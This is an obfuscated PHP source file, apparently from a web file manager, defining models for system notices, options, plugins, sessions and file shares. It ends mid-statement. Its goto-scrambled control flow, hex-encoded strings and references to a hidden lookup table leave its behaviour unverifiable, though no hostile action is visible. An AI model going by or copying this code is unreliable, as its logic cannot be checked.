<?php
 goto AÛñÒãóè; DâÕÊÛ¯å†: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\156\x6f\x74\151\143\x65\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x63\x6f\x6e\164\x65\156\164", "\141\165\x74\150", "\155\157\x64\145", "\x74\151\x6d\145", "\164\171\160\x65", "\x6c\145\x76\x65\154", "\x65\156\141\142\154\x65", "\x73\157\162\x74"); public function listData($d×Âíˆå…¡ = false, $C³±§í×ñ¶ = "\163\157\x72\x74", $B«†ˆÀáå„ = false) { return parent::listData($d×Âíˆå…¡, $C³±§í×ñ¶, $B«†ˆÀáå„); } public function add($EÜ™†¯ÂŠÇ) { $BŠÑÌ¥öš =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d²ÍÑçŠ¶ä = time(); if ($EÜ™†¯ÂŠÇ[$BŠÑÌ¥öš[12]] == $BŠÑÌ¥öš[2498]) { $d²ÍÑçŠ¶ä = strtotime($EÜ™†¯ÂŠÇ[$BŠÑÌ¥öš[190]]); } $EÜ™†¯ÂŠÇ[$BŠÑÌ¥öš[190]] = $d²ÍÑçŠ¶ä; return parent::insert($EÜ™†¯ÂŠÇ); } public function update($e½Øêãøé, $f¨©ƒï†) { goto eÈ¨È›ƒ¦å; eÈ¨È›ƒ¦å: $fÉŒøë™¶Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e˜Æµî¬¸› = $this->listData($e½Øêãøé); if (!$e˜Æµî¬¸›) { return !1; } goto Fƒ“Ï¿îøñ; câƒ‘˜ƒ·: return parent::update($e½Øêãøé, $f¨©ƒï†); goto FˆÏ×ô—½; Fƒ“Ï¿îøñ: $d÷Í®ÄÅö = time(); if ($f¨©ƒï†[$fÉŒøë™¶Š[12]] == $fÉŒøë™¶Š[2498]) { $d÷Í®ÄÅö = strtotime($f¨©ƒï†[$fÉŒøë™¶Š[190]]); } $f¨©ƒï†[$fÉŒøë™¶Š[190]] = $d÷Í®ÄÅö; goto câƒ‘˜ƒ·; FˆÏ×ô—½: } public function remove($CÁ…Ò‘«‰‡) { $e¡ò±ùù– = $this->listData($CÁ…Ò‘«‰‡); if (!$e¡ò±ùù– || $e¡ò±ùù–[$_SERVER[´Ù×Íå‘ÄõÛ][1084]]) { return !1; } return parent::remove($CÁ…Ò‘«‰‡); } public function sort($dŠš¬¤â¤, $CòÒÓÙ‰ïŠ) { return parent::update($dŠš¬¤â¤, $CòÒÓÙ‰ïŠ); } public function enable($c¯¾è° À‚, $d­ àôŒã) { return parent::update($c¯¾è° À‚, array($_SERVER[´Ù×Íå‘ÄõÛ][2499] => $d­ àôŒã)); } private function initUserOption() { $D’”ÎƒÃ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->optionType = $D’”ÎƒÃ[2500]; $this->modelType = $D’”ÎƒÃ[2501]; $this->field = array($D’”ÎƒÃ[2502], $D’”ÎƒÃ[28], $D’”ÎƒÃ[190], $D’”ÎƒÃ[29], $D’”ÎƒÃ[2503], $D’”ÎƒÃ[690], $D’”ÎƒÃ[183]); } public function userNoticeGet($B¿¯×È“Òš = false) { $this->initUserOption(); return parent::listData($B¿¯×È“Òš, $_SERVER[´Ù×Íå‘ÄõÛ][367], !0); } public function userNoticeAdd($Fİ™ñ·Ğò) { $eÊ­ø†ùõ° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initUserOption(); $C¤Å¹Ë¢Àê = $this->findByKey($eÊ­ø†ùõ°[2502], $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[367]]); if ($C¤Å¹Ë¢Àê) { return !0; } $E”»¡ ‘¿ß = array($eÊ­ø†ùõ°[2502] => $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[367]], $eÊ­ø†ùõ°[28] => $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[28]], $eÊ­ø†ùõ°[190] => $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[190]], $eÊ­ø†ùõ°[29] => isset($Fİ™ñ·Ğò[$eÊ­ø†ùõ°[29]]) ? $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[29]] : 1, $eÊ­ø†ùõ°[2503] => isset($Fİ™ñ·Ğò[$eÊ­ø†ùõ°[2503]]) ? $Fİ™ñ·Ğò[$eÊ­ø†ùõ°[2503]] : 0, $eÊ­ø†ùõ°[690] => 0, $eÊ­ø†ùõ°[183] => 0); return parent::insert($E”»¡ ‘¿ß); } public function userNoticeEdit($AåàÁºçŞ«, $fäÚŞ Ü…) { $this->initUserOption(); return parent::update($AåàÁºçŞ«, $fäÚŞ Ü…); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\137\157\x70\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\154\x65", "\162\157\154\145\x47\x72\157\x75\160", "\162\x65\147\151\163\x74", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($bˆï§öÊ­Ş) { return "\x53\171\x73\x74\x65\x6d\117\160\x74\151\x6f\x6e\137{$bˆï§öÊ­Ş}"; } protected function optionDefault($b‡‚Šõ©Ã = '') { $b¹±‡‚›÷¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($b‡‚Šõ©Ã == $b¹±‡‚›÷¯[33]) { return $GLOBALS[$b¹±‡‚›÷¯[6]][$b¹±‡‚›÷¯[2504]]; } } } class SystemRecordModel extends ModelBaseLight { } goto FøÈµë’„; f¸šÎÛ°Ì: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x70\154\x75\147\x69\156\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x74\x61\x74\165\163", "\x72\x65\147\151\x65\x73\164", "\143\157\x6e\x66\x69\147"); public function loadList($E÷´×¸‚Ú = false) { $AèÚ·Úã«¼ = array_to_keyvalue($this->listData(), $_SERVER[´Ù×Íå‘ÄõÛ][28]); if ($E÷´×¸‚Ú) { return $AèÚ·Úã«¼[$E÷´×¸‚Ú]; } return $AèÚ·Úã«¼; } public function init() { $EÁ¤¦Ôã—š =& $_SERVER[´Ù×Íå‘ÄõÛ]; Hook::trigger($EÁ¤¦Ôã—š[2217]); $dëß®¿Ä¬Ç = $this->loadPluginList(); foreach ($dëß®¿Ä¬Ç as $a’íŠâÀ¶š => $C…™èËĞÑ) { $BŒØìŠß»é = $this->appAllow($a’íŠâÀ¶š, $C…™èËĞÑ); if (!$BŒØìŠß»é) { continue; } foreach ($C…™èËĞÑ[$EÁ¤¦Ôã—š[2218]] as $BÖ²‡½ç => $a”Üõ£) { Hook::bind($BÖ²‡½ç, $a”Üõ£); } } Hook::trigger($EÁ¤¦Ôã—š[2219]); Hook::trigger(ACTION); } public function appAllow($dÍŠ¿ŒºÙÈ, $EîÅÙÜ°Á¹, $dâ–Î¯¸¾¤ = true) { $A·ùëÆæ³ó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÓ‡å’‡™ = PLUGIN_DIR . $dÍŠ¿ŒºÙÈ . $A·ùëÆæ³ó[2220]; if (!is_array($EîÅÙÜ°Á¹) || !is_array($EîÅÙÜ°Á¹[$A·ùëÆæ³ó[2218]]) || !is_file($FÓ‡å’‡™) || $EîÅÙÜ°Á¹[$A·ùëÆæ³ó[690]] != 1) { return !1; } if ($dâ–Î¯¸¾¤ && !Action($A·ùëÆæ³ó[2221])->checkAuth($dÍŠ¿ŒºÙÈ)) { return !1; } return !0; } public function unInstall($cİ¨Ä‡‹ø) { $e‚›ô³‚Ô© =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÒÂÎŸ¢“‡ = $this->loadList($cİ¨Ä‡‹ø); if (file_exists(PLUGIN_DIR . $cİ¨Ä‡‹ø)) { Hook::apply($cİ¨Ä‡‹ø . $e‚›ô³‚Ô©[2222]); } $this->remove($eÒÂÎŸ¢“‡[$e‚›ô³‚Ô©[367]]); } public function changeStatus($Aßéˆ³›­¨, $F••ŞˆÆÛ) { $DŠ…Öİ¨æÔ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E÷ÜŸ†­Í = $this->loadList($Aßéˆ³›­¨); if ($F••ŞˆÆÛ) { Hook::apply($Aßéˆ³›­¨ . $DŠ…Öİ¨æÔ[2223]); } $this->update($E÷ÜŸ†­Í[$DŠ…Öİ¨æÔ[367]], array($DŠ…Öİ¨æÔ[2224] => $F••ŞˆÆÛ)); } public function appRegist($Cƒ¶¶…ŸÙì, $dˆÆğ•íÀ¹) { $B©äÜÁ¦öè =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÃÙŸÎ¼‡¿ = $this->loadList($Cƒ¶¶…ŸÙì); if ($CÃÙŸÎ¼‡¿) { $this->update($CÃÙŸÎ¼‡¿[$B©äÜÁ¦öè[367]], array($B©äÜÁ¦öè[2218] => $dˆÆğ•íÀ¹)); } else { $B·†šòîŸ = array($B©äÜÁ¦öè[28] => $Cƒ¶¶…ŸÙì, $B©äÜÁ¦öè[2218] => $dˆÆğ•íÀ¹, $B©äÜÁ¦öè[690] => 0, $B©äÜÁ¦öè[6] => $this->getConfigDefault($Cƒ¶¶…ŸÙì)); $this->insert($B·†šòîŸ); } } public function getConfigDefault($AÈĞ¤ì‡Ì¯) { $aº×ÖšÍ¬Î =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E¥™êšë¤ = array(); $B„¶¹Œ‘ß = $this->getPackageJson($AÈĞ¤ì‡Ì¯); if (!$B„¶¹Œ‘ß && is_array($B„¶¹Œ‘ß[$aº×ÖšÍ¬Î[2225]])) { return $E¥™êšë¤; } foreach ($B„¶¹Œ‘ß[$aº×ÖšÍ¬Î[2225]] as $Fßòºëø… => $AàëÑ­µöğ) { if (!isset($AàëÑ­µöğ[$aº×ÖšÍ¬Î[359]]) || isset($E¥™êšë¤[$Fßòºëø…])) { continue; } $E¥™êšë¤[$Fßòºëø…] = $AàëÑ­µöğ[$aº×ÖšÍ¬Î[359]]; } return $E¥™êšë¤; } public function getPackageJson($Fçáé¤“Âî) { return Hook::apply($Fçáé¤“Âî . $_SERVER[´Ù×Íå‘ÄõÛ][2226]); } public function getConfig($CÀĞ’ÒœÄ–, $d†ÎŸ•·Ğƒ = false) { $bó¹–¢ê©‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÚ½‘Â’Ã… = array(); $CÔøá—¾ â = $this->loadList($CÀĞ’ÒœÄ–); if ($CÔøá—¾ â && is_array($CÔøá—¾ â[$bó¹–¢ê©‡[6]])) { $fÚ½‘Â’Ã… = $CÔøá—¾ â[$bó¹–¢ê©‡[6]]; } if (!$fÚ½‘Â’Ã… || $d†ÎŸ•·Ğƒ) { $fÚ½‘Â’Ã… = $this->getConfigDefault($CÀĞ’ÒœÄ–); } return $fÚ½‘Â’Ã…; } public function setConfig($AãÀÃÌØšæ, $F¼ÜË±‰¡” = false) { goto F©É®¶¤££; F©É®¶¤££: $e£—÷œŸ´– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bß”„ÆÎ›ã = $this->loadList($AãÀÃÌØšæ); if (!$Bß”„ÆÎ›ã) { return !1; } goto cÅó³Õ¬ª; cÅó³Õ¬ª: $FäŒÎËè±¶ = $Bß”„ÆÎ›ã[$e£—÷œŸ´–[6]]; if ($F¼ÜË±‰¡” == !1) { $FäŒÎËè±¶ = array(); $F¼ÜË±‰¡” = $this->getConfigDefault($AãÀÃÌØšæ); } foreach ($F¼ÜË±‰¡” as $BÏî”ù“’è => $EâÒä»„Ò¼) { $FäŒÎËè±¶[$BÏî”ù“’è] = is_string($EâÒä»„Ò¼) ? trim($EâÒä»„Ò¼) : $EâÒä»„Ò¼; } goto eÌï›ÎğŠ§; eÌï›ÎğŠ§: $this->update($Bß”„ÆÎ›ã[$e£—÷œŸ´–[367]], array($e£—÷œŸ´–[6] => $FäŒÎËè±¶)); goto bĞÕŞğà¿“; bĞÕŞğà¿“: } public function viewList() { goto AÃö©Ş¿Õ“; aŒ¿˜¤ğ°: return $cì×İ¥åÜŸ; goto BÛºµÍ¤¶Á; AÃö©Ş¿Õ“: $BŠØÀ®„Ï” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¬÷²‘¹ÁĞ = $this->loadList(); $this->pluginScan($c¬÷²‘¹ÁĞ); goto f‡ë‹ÃÏÍ†; f‡ë‹ÃÏÍ†: $c¬÷²‘¹ÁĞ = $this->loadPluginList(); $cì×İ¥åÜŸ = array(); foreach ($c¬÷²‘¹ÁĞ as $Då¦ÒÑªÀ => $b…®Şˆ° Ğ) { unset($b…®Şˆ° Ğ[$BŠØÀ®„Ï”[2218]], $b…®Şˆ° Ğ[$BŠØÀ®„Ï”[6]]); $b«ÑÄæ‚¸Š = PLUGIN_DIR . $b…®Şˆ° Ğ[$BŠØÀ®„Ï”[28]] . $BŠØÀ®„Ï”[2220]; if (!is_file($b«ÑÄæ‚¸Š)) { continue; } $b‰Œò®î²¨ = Hook::apply($b…®Şˆ° Ğ[$BŠØÀ®„Ï”[28]] . $BŠØÀ®„Ï”[2226]); if (is_array($b‰Œò®î²¨)) { $cì×İ¥åÜŸ[$Då¦ÒÑªÀ] = array_merge($b…®Şˆ° Ğ, $b‰Œò®î²¨); } } goto aŒ¿˜¤ğ°; BÛºµÍ¤¶Á: } private function loadPluginList() { $aâ•êêØæ» =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¬Œ¢²åÚ = $this->loadList(); if (strtolower(MOD) == $aâ•êêØæ»[2227]) { return $f¬Œ¢²åÚ; } $dçÙ¨òà‡Ã = Hook::trigger($aâ•êêØæ»[2228], $f¬Œ¢²åÚ); if ($f¬Œ¢²åÚ && !$dçÙ¨òà‡Ã) { die; } return $dçÙ¨òà‡Ã ? $dçÙ¨òà‡Ã : $f¬Œ¢²åÚ; } private function pluginScan($eœ­Œ¿ò¬) { $DêáÂå ‰® =& $_SERVER[´Ù×Íå‘ÄõÛ]; recursion_dir(PLUGIN_DIR, $eÙˆ†…·ø, $c†Š¶™‘, 0); foreach ($eÙˆ†…·ø as $DÖô›’–) { $E¡—‰ìÍÍó = get_path_this($DÖô›’–); if (isset($eœ­Œ¿ò¬[$E¡—‰ìÍÍó]) || !file_exists($DÖô›’– . $DêáÂå ‰®[2229]) || !file_exists($DÖô›’– . $DêáÂå ‰®[2220])) { continue; } Hook::apply($E¡—‰ìÍÍó . $DêáÂå ‰®[2223]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\155\137\x73\x65\x73\163\x69\x6f\x6e"; public function get($DÃğãÓ½‚) { $BĞÕŒŒØßì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÎëõã‰İ = $this->where(array($BĞÕŒŒØßì[2230] => $DÃğãÓ½‚))->find(); if (!is_array($fÎëõã‰İ)) { return !1; } return $fÎëõã‰İ[$BĞÕŒŒØßì[693]]; } public function set($få‚‘¬šæœ, $e»æà¿ñ“«, $Fˆğ•¬¨“è = 3600) { $eèçÖ’¦ã¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¦ ¼¡ÍÚ× = array($eèçÖ’¦ã¡[2230] => $få‚‘¬šæœ, $eèçÖ’¦ã¡[2142] => $e»æà¿ñ“«, $eèçÖ’¦ã¡[2231] => $Fˆğ•¬¨“è + time()); if (Session::get($eèçÖ’¦ã¡[2232])) { $c¦ ¼¡ÍÚ×[$eèçÖ’¦ã¡[1441]] = Session::get($eèçÖ’¦ã¡[2232]); } else { $c¦ ¼¡ÍÚ×[$eèçÖ’¦ã¡[1441]] = 0; } if ($this->get($få‚‘¬šæœ)) { return $this->where(array($eèçÖ’¦ã¡[2230] => $få‚‘¬šæœ))->save($c¦ ¼¡ÍÚ×); } else { return $this->add($c¦ ¼¡ÍÚ×, array(), !0); } } public function remove($eÌªä«Ò˜Ğ) { return $this->where(array($_SERVER[´Ù×Íå‘ÄõÛ][2230] => $eÌªä«Ò˜Ğ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[´Ù×Íå‘ÄõÛ][2233] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\x54\x69\155\145", "\x74\151\155\145", "\151\156\163\145\162\164\x2c\x75\160\x64\141\164\145", "\146\x75\156\x63\x74\x69\x6f\156"), array("\143\162\145\141\x74\145\124\x69\155\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\164", "\x66\165\x6e\x63\164\x69\x6f\x6e"), array("\157\160\x74\151\x6f\x6e\x73", '', "\151\156\x73\145\162\x74\54\x75\160\144\x61\x74\145\x2c\x73\x65\154\145\x63\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($a™äÃˆùµ¸) { $fõ¨ÂÛ®ˆĞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bå‰‹×†¿° = isset($a™äÃˆùµ¸[0]) ? $a™äÃˆùµ¸[0] : !1; return array($fõ¨ÂÛ®ˆĞ[2234] => array(USER_ID, $fõ¨ÂÛ®ˆĞ[2235]), $fõ¨ÂÛ®ˆĞ[2183] => array($Bå‰‹×†¿°, $fõ¨ÂÛ®ˆĞ[2236])); } protected function listSimple() { $dÅß•ëæ®… = array($_SERVER[´Ù×Íå‘ÄõÛ][1441] => USER_ID); $e¦†¤¼ãËÁ = $this->field($this->fieldList)->where($dÅß•ëæ®…)->select(); return $e¦†¤¼ãËÁ ? $e¦†¤¼ãËÁ : array(); } protected function getInfo($C„»åĞ®, $B–†ÕŠª± = false) { $B½ê²š´˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($B–†ÕŠª±) { return $this->_getShareInfo(array($B½ê²š´˜[441] => $C„»åĞ®)); } $bƒ…Œ…Ÿº³ = $this->cacheFunctionGet($B½ê²š´˜[2237], $C„»åĞ®); return $bƒ…Œ…Ÿº³; } public function getInfoByHash($EÑÌ‚ğ‚æğ) { return $this->_getShareInfo(array($_SERVER[´Ù×Íå‘ÄõÛ][443] => $EÑÌ‚ğ‚æğ)); } public function getInfoByPath($E¬£¯­„‘) { $dÑ¤ˆæÃî =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FğË—òŒŞ¦ = array($dÑ¤ˆæÃî[1441] => USER_ID, $dÑ¤ˆæÃî[369] => $E¬£¯­„‘); return $this->_getShareInfo($FğË—òŒŞ¦); } public function getInfoBySourcePath($A´´ªÉ¹º¶) { $aíº•Â®¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A´ñ¼‹¶‚ = array($aíº•Â®¡[1441] => USER_ID, $aíº•Â®¡[1023] => $A´´ªÉ¹º¶); return $this->_getShareInfo($A´ñ¼‹¶‚); } private function _getShareInfo($fã£¿ª®äï) { goto c‘Š…£óò­; eˆ³§‘¶Î¨: $fã£¿ª®äï = array($E‚£Ô«¢œö[441] => $BÖóµÀ…„ª[$E‚£Ô«¢œö[441]]); $aÎ”ä³²’ò = $E‚£Ô«¢œö[2238]; $DÖ™•šƒ¬ = Model($E‚£Ô«¢œö[539])->order($E‚£Ô«¢œö[367])->field($aÎ”ä³²’ò)->where($fã£¿ª®äï)->select(); goto cŸä¸Û“¼; c‘Š…£óò­: $E‚£Ô«¢œö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÖóµÀ…„ª = $this->where($fã£¿ª®äï)->find(); if (!$BÖóµÀ…„ª) { return !1; } goto eˆ³§‘¶Î¨; cŸä¸Û“¼: if ($BÖóµÀ…„ª[$E‚£Ô«¢œö[369]] == $E‚£Ô«¢œö[470]) { $BÖóµÀ…„ª[$E‚£Ô«¢œö[391]] = IO::info($BÖóµÀ…„ª[$E‚£Ô«¢œö[1023]]); } else { $BÖóµÀ…„ª[$E‚£Ô«¢œö[391]] = Model($E‚£Ô«¢œö[1121])->pathInfo($BÖóµÀ…„ª[$E‚£Ô«¢œö[369]]); } $BÖóµÀ…„ª[$E‚£Ô«¢œö[2239]] = $DÖ™•šƒ¬; return $BÖóµÀ…„ª; goto f’ƒ¢ñâˆ; f’ƒ¢ñâˆ: } protected function getInfoAuth($EÁëË™Ïƒº) { $a›œáˆÓŸ÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dæŒĞÓ„Óì = $this->getInfo($EÁëË™Ïƒº); $dæŒĞÓ„Óì[$a›œáˆÓŸ÷[376]] = Model($a›œáˆÓŸ÷[456])->authMake($dæŒĞÓ„Óì[$a›œáˆÓŸ÷[2239]]); return $dæŒĞÓ„Óì; } protected function listData($a¶øµŒ”êŸ = null, $D“ÍÒÆ—õí = 300) { $DÙÚÅë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÖğİ¤©ì  = array(array($DÙÚÅë[446] => array($DÙÚÅë[929], 0), $DÙÚÅë[448] => array($DÙÚÅë[929], 0), $DÙÚÅë[2240] => $DÙÚÅë[2197])); if ($a¶øµŒ”êŸ == $DÙÚÅë[1878]) { $aÖğİ¤©ì  = array($DÙÚÅë[446] => 1); } else { if ($a¶øµŒ”êŸ == $DÙÚÅë[1012]) { $aÖğİ¤©ì  = array($DÙÚÅë[448] => 1); } } $aÖğİ¤©ì [$DÙÚÅë[1441]] = USER_ID; $b‹êèñÎå– = $this->where($aÖğİ¤©ì )->selectPage($D“ÍÒÆ—õí); return $b‹êèñÎå–; } protected function listToMe($EÒâŞŞ³ò = 300) { goto A©‰ÔÌØÜ›; aÊâ†¸æ‘¡: $Eš‹¼…‰ = array($eğ†“‰¥Ë»[523] => SourceModel::TYPE_USER, $eğ†“‰¥Ë»[458] => USER_ID); if ($Dñ†ˆËñ“—) { $Eš‹¼…‰ = array(array($eğ†“‰¥Ë»[523] => SourceModel::TYPE_USER, $eğ†“‰¥Ë»[458] => USER_ID), array($eğ†“‰¥Ë»[523] => SourceModel::TYPE_GROUP, $eğ†“‰¥Ë»[458] => array($eğ†“‰¥Ë»[7], $Dñ†ˆËñ“—)), $eğ†“‰¥Ë»[2240] => $eğ†“‰¥Ë»[2197]); } $FÕÙ¨®¥Ÿ± = Model($eğ†“‰¥Ë»[539])->where($Eš‹¼…‰)->selectPage($EÒâŞŞ³ò); goto D–ƒæÈ¶İœ; a§œ™ÉÈ: $Aù“­µó²İ = array($eğ†“‰¥Ë»[2243] => $cªÂÜ…ÒÍ¶, $eğ†“‰¥Ë»[2244] => $FÕÙ¨®¥Ÿ±[$eğ†“‰¥Ë»[351]]); return $Aù“­µó²İ; goto eÙ…êó™«ö; D–ƒæÈ¶İœ: $e……»·Œ®Î = array_to_keyvalue_group($FÕÙ¨®¥Ÿ±[$eğ†“‰¥Ë»[354]], $eğ†“‰¥Ë»[441]); if (!$e……»·Œ®Î) { return $FÕÙ¨®¥Ÿ±; } $EĞøƒÒ†¬½ = $eğ†“‰¥Ë»[2242]; goto b›ˆ×Ó±Ôİ; b›ˆ×Ó±Ôİ: $Eš‹¼…‰ = array($eğ†“‰¥Ë»[441] => array($eğ†“‰¥Ë»[384], array_keys($e……»·Œ®Î))); $cªÂÜ…ÒÍ¶ = $this->field($EĞøƒÒ†¬½)->where($Eš‹¼…‰)->select(); foreach ($cªÂÜ…ÒÍ¶ as $bÑ÷Ì°‰« => &$Cœ¤¥É“Üª) { $Cœ¤¥É“Üª[$eğ†“‰¥Ë»[2239]] = $e……»·Œ®Î[$Cœ¤¥É“Üª[$eğ†“‰¥Ë»[441]]]; } goto a§œ™ÉÈ; A©‰ÔÌØÜ›: $eğ†“‰¥Ë» =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C“Ú‹ˆ¬çŠ = Session::get($eğ†“‰¥Ë»[2241]); $Dñ†ˆËñ“— = array_to_keyvalue($C“Ú‹ˆ¬çŠ, $eğ†“‰¥Ë»[33], $eğ†“‰¥Ë»[2112]); goto aÊâ†¸æ‘¡; eÙ…êó™«ö: } protected function shareAdd($Eª‰‚ÍÈÅê, $b°ÙÃ×…ÏË) { $bïÅù¢„È =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B½¡ß£±è… = $this->_addShareData($Eª‰‚ÍÈÅê, $b°ÙÃ×…ÏË); if (!empty($b°ÙÃ×…ÏË[$bïÅù¢„È[2245]])) { $this->_shareAuthSet($B½¡ß£±è…, $b°ÙÃ×…ÏË[$bïÅù¢„È[2245]]); } $this->shareEventAdd($Eª‰‚ÍÈÅê, $b°ÙÃ×…ÏË, $bïÅù¢„È[1015]); return $B½¡ß£±è…; } private function shareEventAdd($Aš±»Ş¦”Á, $f¾×½“¶æ, $B‚ßÛç½ÌÅ = "\x61\144\x64") { goto eÖŞäá¹; fÁçÚ¦¹Œİ: return; goto dœˆõ¿õŸ²; E¾»ÒµñÒ¬: $f¨³¦ä‡ó‘ = $E³·‹ÖĞİ[2248]; if ($dœ‹ÕŒà·Ÿ[$E³·‹ÖĞİ[446]] == $E³·‹ÖĞİ[470] && $f¾×½“¶æ[$E³·‹ÖĞİ[446]] == $E³·‹ÖĞİ[83]) { $f¨³¦ä‡ó‘ = $E³·‹ÖĞİ[2246]; } if ($dœ‹ÕŒà·Ÿ[$E³·‹ÖĞİ[446]] == $E³·‹ÖĞİ[83] && $f¾×½“¶æ[$E³·‹ÖĞİ[446]] == $E³·‹ÖĞİ[470]) { $f¨³¦ä‡ó‘ = $E³·‹ÖĞİ[2249]; } goto dêåå‚±ç; eÖŞäá¹: $E³·‹ÖĞİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($B‚ßÛç½ÌÅ == $E³·‹ÖĞİ[1015]) { if ($f¾×½“¶æ[$E³·‹ÖĞİ[446]] == $E³·‹ÖĞİ[83]) { Model($E³·‹ÖĞİ[507])->eventShare($Aš±»Ş¦”Á, $E³·‹ÖĞİ[2246]); } if ($f¾×½“¶æ[$E³·‹ÖĞİ[448]] == $E³·‹ÖĞİ[83]) { Model($E³·‹ÖĞİ[507])->eventShare($Aš±»Ş¦”Á, $E³·‹ÖĞİ[2247]); } return; } $dœ‹ÕŒà·Ÿ = $this->getInfoByPath($Aš±»Ş¦”Á); goto E¾»ÒµñÒ¬; dêåå‚±ç: if ($dœ‹ÕŒà·Ÿ[$E³·‹ÖĞİ[448]] == $E³·‹ÖĞİ[470] && $f¾×½“¶æ[$E³·‹ÖĞİ[448]] == $E³·‹ÖĞİ[83]) { $f¨³¦ä‡ó‘ = $E³·‹ÖĞİ[2247]; } if ($dœ‹ÕŒà·Ÿ[$E³·‹ÖĞİ[448]] == $E³·‹ÖĞİ[83] && $f¾×½“¶æ[$E³·‹ÖĞİ[448]] == $E³·‹ÖĞİ[470]) { $f¨³¦ä‡ó‘ = $E³·‹ÖĞİ[2250]; } Model($E³·‹ÖĞİ[507])->eventShare($Aš±»Ş¦”Á, $f¨³¦ä‡ó‘); goto fÁçÚ¦¹Œİ; dœˆõ¿õŸ²: } private function _addShareData($cÙŠÀ½Á’, $D•øøËÕ¤Å = array()) { goto aËîÛ°Ë„ù; a²óÓÁ§„­: if ($bØê»àÈãµ = $this->where($cğÈõ©ô¸ß)->find()) { return $bØê»àÈãµ[$D¢¸ÎË…éÛ[441]]; } if ($cÙŠÀ½Á’ == 0) { $C‡¢å©»ƒŒ = array($D¢¸ÎË…éÛ[28] => get_path_this($D•øøËÕ¤Å[$D¢¸ÎË…éÛ[75]])); } else { $C‡¢å©»ƒŒ = Model($D¢¸ÎË…éÛ[753])->sourceInfo($cÙŠÀ½Á’); if (!$C‡¢å©»ƒŒ) { return !1; } } if (!$D•øøËÕ¤Å[$D¢¸ÎË…éÛ[1347]]) { $D•øøËÕ¤Å[$D¢¸ÎË…éÛ[1347]] = $C‡¢å©»ƒŒ[$D¢¸ÎË…éÛ[28]]; } goto F„º¤ìŒì; c·›°Öõ­: $f«ÍŸ‹Êç = $this->add($câÍà·„Õ°); $BËœÆÕë× = array($D¢¸ÎË…éÛ[443] => short_id($f«ÍŸ‹Êç)); $this->where(array($D¢¸ÎË…éÛ[440] => $f«ÍŸ‹Êç))->save($BËœÆÕë×); goto DˆïÇùå; F„º¤ìŒì: $câÍà·„Õ° = array($D¢¸ÎË…éÛ[1432] => USER_ID, $D¢¸ÎË…éÛ[383] => $cÙŠÀ½Á’, $D¢¸ÎË…éÛ[1347] => $D¢¸ÎË…éÛ[33], $D¢¸ÎË…éÛ[446] => 0, $D¢¸ÎË…éÛ[448] => 0, $D¢¸ÎË…éÛ[1023] => $D¢¸ÎË…éÛ[33], $D¢¸ÎË…éÛ[295] => $D¢¸ÎË…éÛ[33], $D¢¸ÎË…éÛ[805] => $D¢¸ÎË…éÛ[33], $D¢¸ÎË…éÛ[2252] => 0, $D¢¸ÎË…éÛ[2253] => 0, $D¢¸ÎË…éÛ[449] => 0, $D¢¸ÎË…éÛ[450] => $D¢¸ÎË…éÛ[33], $D¢¸ÎË…éÛ[443] => $D¢¸ÎË…éÛ[33]); $c’Áˆå”˜³ = explode($D¢¸ÎË…éÛ[47], $D¢¸ÎË…éÛ[2254]); foreach ($c’Áˆå”˜³ as $fã¾†æŠŒÒ) { if (!isset($D•øøËÕ¤Å[$fã¾†æŠŒÒ])) { continue; } $câÍà·„Õ°[$fã¾†æŠŒÒ] = $D•øøËÕ¤Å[$fã¾†æŠŒÒ]; } goto c·›°Öõ­; aËîÛ°Ë„ù: $D¢¸ÎË…éÛ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cğÈõ©ô¸ß = array($D¢¸ÎË…éÛ[383] => $cÙŠÀ½Á’, $D¢¸ÎË…éÛ[1432] => USER_ID); if ($cÙŠÀ½Á’ == 0) { $cğÈõ©ô¸ß = array($D¢¸ÎË…éÛ[2251] => $D•øøËÕ¤Å[$D¢¸ÎË…éÛ[1023]], $D¢¸ÎË…éÛ[1432] => USER_ID); } goto a²óÓÁ§„­; DˆïÇùå: return 